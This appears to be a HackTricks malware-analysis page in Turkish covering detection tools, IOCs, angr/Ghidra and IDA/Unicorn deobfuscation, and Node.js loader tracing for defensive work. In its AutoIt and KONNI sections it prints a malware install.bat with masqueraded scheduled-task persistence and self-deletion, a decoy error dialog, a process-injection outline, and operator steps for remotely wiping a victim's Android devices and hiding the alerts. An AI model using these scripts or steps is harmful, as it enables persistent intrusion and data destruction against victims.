# Malware Analizi

{{#include ../../banners/hacktricks-training.md}}

## Adli Bilişim CheatSheet'leri

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Çevrimiçi Hizmetler

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Çevrimdışı Antivirüs ve Tespit Araçları

### Yara

#### Kurulum
```bash
sudo apt-get install -y yara
```
#### Kuralları hazırla

Bu script'i github'dan tüm yara malware kurallarını indirmek ve birleştirmek için kullanın: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
_**rules**_ dizinini oluşturun ve çalıştırın. Bu işlem _**malware_rules.yar**_ adlı bir dosya oluşturacak ve içinde malware için tüm yara kuralları bulunacaktır.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Tarama
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malware'ı kontrol et ve kurallar oluştur

Bu aracı [**YaraGen**](https://github.com/Neo23x0/yarGen) kullanarak bir binary'den yara rules oluşturabilirsiniz. Bu öğreticilere göz atın: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Kurulum
```
sudo apt-get install -y clamav
```
#### Tarama
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** çalıştırılabilir dosyalarda (PE, ELF, .NET) potansiyel olarak zararlı **yetenekleri** tespit eder. Bu yüzden Att\&ck taktikleri gibi şeyleri veya şu tür şüpheli yetenekleri bulur:

- OutputDebugString hatasını kontrol et
- servis olarak çalıştır
- süreç oluştur

İndirin: [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC, Indicator Of Compromise'ın kısaltmasıdır. Bir IOC, bazı potansiyel istenmeyen yazılımları veya doğrulanmış **malware**'i tanımlayan **tanımlayıcı koşullar** kümesidir. Blue Teams bu tür tanımları, kendi **sistemlerinde** ve **ağlarında** bu tür **zararlı dosyaları aramak** için kullanır.\\
Bu tanımları paylaşmak çok faydalıdır; çünkü bir bilgisayarda malware tespit edildiğinde ve o malware için bir IOC oluşturulduğunda, diğer Blue Teams onu daha hızlı tanımlamak için kullanabilir.

IOC oluşturmak veya değiştirmek için bir araç [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\\
Bir cihazda **tanımlı IOC'leri aramak** için [**Redline**](https://www.fireeye.com/services/freeware/redline.html) gibi araçları kullanabilirsiniz.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) basit İhlal Göstergeleri için bir tarayıcıdır.\\
Tespit, dört tespit yöntemine dayanır:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) Linux için GNU GPLv2 lisansı altında yayımlanan bir malware tarayıcısıdır; paylaşılan barındırma ortamlarında karşılaşılan tehditler göz önünde bulundurularak tasarlanmıştır. Ağ kenarı saldırı tespit sistemlerinden gelen tehdit verilerini kullanarak saldırılarda aktif olarak kullanılan malware'i ayıklar ve tespit için imzalar üretir. Ayrıca tehdit verileri, LMD checkout özelliğiyle yapılan kullanıcı gönderimleri ve malware topluluk kaynaklarından da elde edilir.

### rkhunter

[**rkhunter**](http://rkhunter.sourceforge.net) gibi araçlar dosya sistemini olası **rootkits** ve malware için kontrol etmek amacıyla kullanılabilir.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) farklı teknikler kullanarak yürütülebilir dosyalar içinde **obfuscated strings** bulmaya çalışacak bir araçtır.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) yürütülebilir dosya içinde bazı temel şeyleri kontrol eder (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) imports, exports, headers gibi Windows executables hakkında bilgi almanızı sağlayan bir araçtır; ayrıca VirusTotal'u kontrol eder ve potansiyel Att\&ck tekniklerini bulur.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) bir dosyanın **encrypted** olup olmadığını tespit etmek ve ayrıca **packers**'ı bulmak için kullanılan bir araçtır.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) metin/skript dosyaları içinde **obfuscated** ve **encrypted** içeriği tespit etmek için çeşitli **statistical methods** kullanan bir Python scriptidir. NeoPI'nin amaçlanan kullanım amacı **detection of hidden web shell code**'a yardımcı olmaktır.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) **obfuscated**/**dodgy code**'u ve ayrıca sıklıkla **malwares**/webshells'te kullanılan **PHP** fonksiyonlarını kullanan dosyaları tespit etmek için elinden geleni yapar.

### Apple Binary Signatures

Bazı **malware sample**'larını incelerken, imzalayan **developer**'ın daha önce **malware** ile **related** olabileceğini göz önünde bulundurarak ikili dosyanın imzasını her zaman kontrol etmelisiniz.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Tespit Teknikleri

### File Stacking

Eğer bir klasörün içinde bulunan web server'ın **files**'larının **son olarak bir tarihte güncellendiğini** biliyorsanız. Web server'daki tüm **files**'ların oluşturulma ve değiştirilme tarihlerini **kontrol edin**; herhangi bir tarih **şüpheli** ise o **file**'ı kontrol edin.

### Baselines

Bir klasörün **files**'larının **değiştirilmemesi gerekiyorsa**, klasörün **orijinal files**'larının **hash**'ini hesaplayıp bunları **şimdiki** olanlarla **karşılaştırabilirsiniz**. Değiştirilmiş olan her şey **şüpheli** olacaktır.

### Statistical Analysis

Bilgiler logs'lara kaydedildiğinde, örneğin her bir web server dosyasına kaç kez erişildiği gibi istatistikleri **kontrol edebilirsiniz**; çünkü bir web shell muhtemelen en sık erişilenlerden biri olabilir.

---

### Android in-app native telemetry (no root)

Android'de, hedef uygulama sürecinin içindeki native kodu, diğer JNI kütüphaneleri initialize olmadan önce küçük bir logger kütüphanesini preload ederek enstrümente edebilirsiniz. Bu, sistem çapında hook'lar veya root olmadan native davranışa erken görünürlük sağlar. Yaygın bir yaklaşım SoTap'tır: doğru ABI için libsotap.so'yu APK'ya bırakın ve erken bir noktaya (ör. static initializer veya Application.onCreate) System.loadLibrary("sotap") çağrısı enjekte edin, ardından logları internal/external path'lerden veya Logcat fallback'ten toplayın.

Kurulum detayları ve log yolları için Android native reversing sayfasına bakın:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Bazı Android malware'leri ve RASP-protected uygulamalar, RegisterNatives çağrılmadan önce JNI method isimlerini ve imzalarını runtime'da decode ederek gizlerler. Frida/ptrace enstrümantasyonu anti-debug tarafından sonlandırıldığında, binary içindeki decoder'ı angr ile çalıştırıp sonuçları Ghidra'ya comment olarak geri iterek plaintext'i offline olarak yine de kurtarabilirsiniz.

Ana fikir: .so içindeki decoder'ı çağrılabilir bir fonksiyon olarak ele almak, .rodata'daki obfuscated byte blob'ları üzerinde çalıştırmak ve çıktıyı ilk \x00 (C-string terminator) kadar somutlaştırmaktır. Adres uyuşmazlıklarını önlemek için angr ve Ghidra'nın aynı image base'i kullanmaya devam etmesini sağlayın.

Workflow overview
- Ghidra'da triage: decoder'ı ve JNI_OnLoad ile RegisterNatives kurulumunda çağırma convention/argümanlarını tespit edin.
- Her hedef string için decoder'ı çalıştırmak ve sonuçları dump etmek üzere angr (CPython3) çalıştırın.
- Ghidra'da notlandırma: hızlı JNI yeniden yapılandırması için her çağrı noktasına dekode edilmiş string'leri otomatik yorum olarak ekleyin.

Ghidra triage (JNI_OnLoad pattern)
- Ghidra'nın JNINativeMethod yapısını tanıması için JNI datatiplerini JNI_OnLoad'a uygulayın.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives çağrılarını arayın. Eğer kütüphane name/signature'ı lokal bir rutin (ör. FUN_00100e10) ile oluşturuyor ve bu rutin statik bir byte tablosuna (ör. DAT_00100bf4) referans veriyorsa ve (encoded_ptr, out_buf, length) gibi parametreler alıyorsa, bu offline execution için ideal bir hedeftir.

angr setup (execute the decoder offline)
- .so'yu Ghidra'da kullanılan aynı base ile (örnek: 0x00100000) yükleyin ve state'i küçük tutmak için external lib'lerin auto-loading'ini devre dışı bırakın.

<details>
<summary>angr kurulumu ve offline decoder çalıştırma</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Büyük ölçekte, call sites ile decoder’s argümanlarının (encoded_ptr, size) statik bir haritasını oluşturun. Wrappers argümanları gizleyebilir, bu yüzden API recovery gürültülü ise bu eşlemeyi Ghidra xrefs'ten manuel oluşturabilirsiniz.

<details>
<summary>angr ile birden çok call site'ı toplu olarak decode etme</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra'da çağrı noktalarını açıklama ile işaretleme
Seçenek A: Sadece Jython ile yorum yazıcısı (önceden oluşturulmuş bir JSON kullanın)
- angr CPython3 gerektirdiği için, obfuskasyonu çözmeyi ve açıklama eklemeyi ayrı tutun. Önce yukarıdaki angr script'ini çalıştırarak decoded_strings.json dosyasını oluşturun. Ardından bu Jython GhidraScript'i çalıştırarak her çağrı noktasına PRE_COMMENTs yazın (bağlam için arayan fonksiyonun adını da dahil eder):

<details>
<summary>Ghidra Jython script'i ile çözülmüş JNI stringlerini açıklama olarak işaretleme</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Tek CPython betiği pyhidra/ghidra_bridge üzerinden
- Alternatif olarak, angr'ı çalıştıran aynı CPython sürecinden Ghidra’nın API'sini sürmek için pyhidra veya ghidra_bridge kullanın. Bu, decode_string() çağırıp aracı bir dosya olmadan hemen PRE_COMMENTs ayarlamaya olanak tanır. Mantık Jython betiğini yansıtır: ReferenceManager aracılığıyla callsite→function eşlemesi oluşturun, angr ile decode edin ve yorumları ayarlayın.

Why this works and when to use it
- Çevrimdışı yürütme RASP/anti-debug'i atlatır: stringleri kurtarmak için ptrace veya Frida hooks gerekmez.
- Ghidra ile angr'in base_addr'lerini hizalamak (örn. 0x00100000), fonksiyon/veri adreslerinin araçlar arasında eşleşmesini sağlar.
- Decoderlar için tekrarlanabilir reçete: dönüşümü saf bir fonksiyon olarak ele alın, yeni bir durumda bir çıktı tamponu ayırın, (encoded_ptr, out_ptr, len) ile çağırın, sonra state.solver.eval ile somutlaştırın ve \x00'e kadar C-strings çözümleyin.

Notes and pitfalls
- Hedef ABI/çağrı konvansiyonuna uyun. angr.factory.callable mimariye göre birini seçer; argümanlar kaymış görünüyorsa cc'yi açıkça belirtin.
- Eğer decoder sıfırlanmış çıktı tamponları bekliyorsa, çağrıdan önce state içinde outbuf'u sıfırlarla başlatın.
- Pozisyon-bağımsız Android .so için, angr'daki adreslerin Ghidra'da görülenlerle eşleşmesi için her zaman base_addr sağlayın.
- Uygulama decoder'ı ince stub'ların arkasına sarsa bile çağrı-xref'lerini listelemek için currentProgram.getReferenceManager() kullanın.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Dinamik Kontrol Akışının Deobfuskasyonu (JMP/CALL RAX Dispatchers)

Modern malware aileleri Kontrol Akış Grafiği (CFG) obfuskasyonunu yoğun şekilde kötüye kullanır: doğrudan bir jump/call yerine hedefi çalışma zamanında hesaplarlar ve `jmp rax` veya `call rax` yürütürler. Küçük bir *dispatcher* (genellikle dokuz talimat) CPU `ZF`/`CF` bayraklarına bağlı olarak nihai hedefi belirler ve statik CFG kurtarmayı tamamen bozar.

The technique – showcased by the SLOW#TEMPEST loader – can be defeated with a three-step workflow that only relies on IDAPython and the Unicorn CPU emulator.

### 1. Her dolaylı jump / call'ı tespit edin
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. dispatcher byte-code'unu çıkarın
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn ile iki kez emüle edin
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
`run(code,0,0)` ve `run(code,1,1)`'i çalıştırarak *false* ve *true* dal hedeflerini elde edin.

### 4. Doğrudan jump / call'ı geri yama
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Yamalamadan sonra, tam CFG ve Hex-Rays çıktısının geri yüklenmesi için IDA'yı fonksiyonu yeniden analiz etmeye zorlayın:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Dolaylı API çağrılarını etiketleme

Her `call rax`'in gerçek hedefi bilindiğinde, IDA'ya bunun ne olduğunu söyleyerek parametre türleri & değişken adlarının otomatik olarak geri kazanılmasını sağlayabilirsiniz:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Pratik faydalar

* Gerçek CFG'yi geri kazanır → dekompilasyon *10* satırdan binlerce satıra çıkar.
* string-cross-reference & xrefs'i etkinleştirir; bu, davranışın yeniden inşasını basit hale getirir.
* Scriptler yeniden kullanılabilir: aynı hileyle korunan herhangi bir loader'a bırakılabilir.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Bu sızma paterni imzalı bir MSI, .a3x olarak derlenmiş AutoIt loader'ları ve meşru bir uygulama gibi davranan bir Task Scheduler işini zincirler.

### MSI → custom actions → AutoIt orchestrator

MSI custom actions tarafından yürütülen işlem ağacı ve komutlar:

- MsiExec.exe → cmd.exe to run install.bat
- WScript.exe to show a decoy error dialog
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader'ı bırakır, persistence sağlar, kendini temizler):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (kullanıcı tuzağı):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Ana artefaktlar ve maskelenme:
- AutoIt3.exe ve IoKlTr.au3 dosyalarını C:\Users\Public\Music konumuna bırakır
- schtasks.exe'yi hwpviewer.exe olarak kopyalar (Hangul Word Processor viewer olarak maskeler)
- Her 1 dakikada bir çalışan "IoKlTr" adlı zamanlanmış görev oluşturur
- Başlangıç LNK'si Smart_Web.lnk olarak görünür; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- %APPDATA%\Google\Browser\ alt klasörlerinde `adb` veya `adv` içeren modülleri yerleştirir ve bunları autoit.vbs/install.bat yardımcı betikleriyle başlatır

Adli triage ipuçları:
- schtasks sorgulaması: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML ile aynı konumda bulunan yeniden adlandırılmış schtasks.exe kopyalarını arayın: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Yaygın yollar: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- İşlem oluşturmayı ilişkilendirin: AutoIt3.exe'nin meşru Windows ikili dosyalarını (ör. cleanmgr.exe, hncfinder.exe) başlatması

### AutoIt loader'ları ve .a3x payload şifre çözme → enjeksiyon

- AutoIt modülleri `#AutoIt3Wrapper_Outfile_type=a3x` ile derlenir ve zararsız süreçlere enjekte etmeden önce gömülü payload'ları çözer.
- Gözlemlenen aileler: QuasarRAT (hncfinder.exe'ye enjekte edilmiş) ve RftRAT/RFTServer (cleanmgr.exe'ye enjekte edilmiş), ayrıca RemcosRAT modülleri (`Remcos\RunBinary.a3x`).
- Şifre çözme deseni: HMAC aracılığıyla bir AES anahtarı türetir, gömülü blob'u çözer, ardından düz metin modülü enjekte eder.

Genel şifre çözme iskeleti (tam HMAC girişi/algoritması aileye göre değişir):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) of the target host (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory with decrypted module/shellcode
- CreateRemoteThread or QueueUserAPC to execute payload

Hunting ideas
- AutoIt3.exe parented by MsiExec.exe or WScript.exe spawning system utilities
- Files with `.a3x` extensions or AutoIt script runners under public/user-writable paths
- Suspicious scheduled tasks executing AutoIt3.exe or binaries not signed by Microsoft, with minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows intrusion sırasında operatörler çalınmış Google kimlik bilgilerini kullanarak mağdurun Android cihazlarını tekrar tekrar silmiş, güvenlik bildirimlerini bastırmış ve aynı zamanda mağdurun oturum açmış masaüstü messenger’ı üzerinden erişimi genişletmişlerdir.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## Tracing heavily obfuscated Node.js loaders

Saldırganlar giderek daha fazla JavaScript loader'ını standalone Windows binary'leri içine, [`nexe`](https://github.com/nexe/nexe) ile derlenmiş şekilde paketliyor; böylece runtime script ile birlikte geliyor. Ortaya çıkan PE genellikle 60–90 MB aralığında oluyor ve Node.js yüklü olmasa bile çalışıyor. Triage sırasında:

- Use [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) to carve the embedded JavaScript out of the PE and feed it to local tooling for static diffing.
- Expect a disk-based mutex in `%TEMP%` (GachiLoader drops a random `<name>.lock` file that expires after ~5 minutes). Copying the file to the sandbox before execution lets you skip redundant stages while still seeing later payloads.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) herhangi bir Node.js sürecinin core modüllerine hook atıyor, anti-VM probe'larını spoof etmeye izin veriyor ve sample'ın yazdığı tüm artefaktları koruyor. Obfuskasyonlu script'leri tracer üzerinden başlatın ki analyst-kontrollü enstrümantasyon call stack içinde kalsın:
```powershell
node -r .\tracer.js main.js
```
Key configuration toggles inside `tracer.js` allow you to:

- Dosya sistemi, child-process ve HTTP etkinliğini kaydetme (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Her bırakılan dosya—ör. `kidkadi.node`—kötü amaçlı yazılım silmeden önce çalışma dizinine kopyalanır.
- Gerçekçi RAM/CPU sayıları döndürerek, `tasklist` çıktısını taklit ederek ve PowerShell/WMI yanıtlarıyla oynayarak ortam parmak izlerini geçersiz kılma. Bu, ≥4 GB RAM, ≥2 çekirdek talep eden ve kullanıcı adlarını (`mashinesssss`, `wdagutilityaccount`, vb.), host adlarını (`desktop-vrsqlag`, `server1` …) ve işlem adlarını (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) inceleyen loader'ları atlatır.
- `Get-WmiObject Win32_DiskDrive` (içinde `vmware`, `kvm`, `virtio`, … arayan), `Win32_VideoController` (“VirtualBox Graphics Adapter”, “Hyper-V Video” vb. engelleyen) ve `Win32_PortConnector` sayıları gibi WMI donanım kontrollerini etkisiz hale getirme. Bu sorgular “gerçek” donanım raporladığında, sandbox'lar GachiLoader'ın analiz süresini boşa harcamak için kullandığı `Invoke-WebRequest` çağrılarının linkedin.com, grok.com, whatsapp.com ve benzeri alanlara yapılan zararsız sonsuz döngüsüne artık girmez.

### Capturing gated C2 traffic automatically

Tracer'ın ağ hook'ları, JavaScript obfuscation'ını tersine çevirmeden çok katmanlı C2 kimlik doğrulamasını ortaya çıkarır. Gözlemlenen kampanyada loader:

1. Her hard-coded C2'ye host telemetrisi için `/log`'a POST yapar.
2. `X-Secret: gachifamily` ile `GET /richfamily/<per-sample key>` isteği yaparak Base64-encoded payload URL'sini alır.
3. O URL'ye, uzun per-sample `X-Secret` header'ı ile son bir `GET` yapar; bu header eksikse `403 Forbidden` döner.

Tracer tam istekleri (headers, bodies, destinations) kaydettiği için aynı trafiği yeniden oynatarak payload'ları çekebilir, Themida/VMProtect kabuklarını belleğe dökebilir ve Rhadamanthys yapılandırma verilerini ölçekli şekilde çıkarabilirsiniz.

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
